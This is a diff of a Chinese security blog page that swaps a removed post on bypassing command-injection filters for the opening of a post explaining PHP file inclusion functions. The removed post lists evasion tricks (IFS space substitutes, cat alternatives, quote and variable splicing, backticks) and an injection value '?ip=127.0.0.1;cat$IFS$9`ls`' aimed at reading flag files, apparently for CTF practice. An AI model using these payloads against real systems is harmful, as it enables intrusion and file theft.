@@ -24,7 +24,7 @@
 
   
 
-  <title>命令执行漏洞过滤的一些简单绕过 | LittleHamster</title>
+  <title>File_Include | LittleHamster</title>
 
   
 
@@ -101,11 +101,11 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">命令执行漏洞过滤的一些简单绕过</h1>
+          <h1 class="title-wrap">File_Include</h1>
           <h2 class="title-sub-wrap">
             <strong>LittleHamster1</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-03-24T13:09:47.000Z" itemprop="datePublished">2024-03-24</time>
+            <time  class="article-date" datetime="2024-04-21T14:13:31.000Z" itemprop="datePublished">2024-04-21</time>
           </h2>
           
           
@@ -138,22 +138,16 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="命令执行漏洞过滤的一些简单绕过"><a href="#命令执行漏洞过滤的一些简单绕过" class="headerlink" title="命令执行漏洞过滤的一些简单绕过"></a>命令执行漏洞过滤的一些简单绕过</h1><h2 id="一、空格过滤"><a href="#一、空格过滤" class="headerlink" title="一、空格过滤"></a>一、空格过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br></pre></td></tr></table></figure>
-
-<h2 id="二、过滤cat"><a href="#二、过滤cat" class="headerlink" title="二、过滤cat"></a>二、过滤cat</h2><h3 id="1、替代法"><a href="#1、替代法" class="headerlink" title="1、替代法"></a>1、替代法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br></pre></td></tr></table></figure>
-
-<h3 id="2、使用转义符号"><a href="#2、使用转义符号" class="headerlink" title="2、使用转义符号"></a>2、<strong>使用转义符号</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ca\t /fl\ag</span><br><span class="line">cat fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
-
-<h3 id="3、拼接法"><a href="#3、拼接法" class="headerlink" title="3、拼接法"></a>3、<strong>拼接法</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;cat$IFS$a$b</span><br></pre></td></tr></table></figure>
-
-<h3 id="4、使用空变量-和-，-x-x-绕过"><a href="#4、使用空变量-和-，-x-x-绕过" class="headerlink" title="4、使用空变量$*和$@，$x,${x}绕过"></a>4、使用空变量$*和$@，$x,${x}绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca$*t flag</span><br><span class="line">ca$@t flag</span><br><span class="line">ca$5t flag</span><br><span class="line">ca$&#123;5&#125;t flag</span><br></pre></td></tr></table></figure>
-
-<h3 id="5、反引号绕过"><a href="#5、反引号绕过" class="headerlink" title="5、反引号绕过"></a>5、反引号绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="三、内联执行绕过"><a href="#三、内联执行绕过" class="headerlink" title="三、内联执行绕过"></a>三、内联执行绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line">这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure>
-
+        <h1 id="一、文件包含漏洞介绍"><a href="#一、文件包含漏洞介绍" class="headerlink" title="一、文件包含漏洞介绍"></a>一、文件包含漏洞介绍</h1><blockquote>
+<p> 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，无需再次编写，这种文件调用的过程一般被称为文件包含。</p>
+</blockquote>
+<p><strong>涉及函数</strong></p>
+<ul>
+<li>include：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</li>
+<li>include_once：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</li>
+<li>require：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</li>
+<li>require_once：和 require 类似，不同处在于 require_once 只导入一次。</li>
+</ul>
 
       </section>
 
@@ -161,20 +155,20 @@
       
         <nav class="article-nav">
           
+          
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/03/24/pwn%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">pwn基础知识</h2>
+        <a href="/2024/04/21/RCE%E6%BC%8F%E6%B4%9E/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">RCE漏洞</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
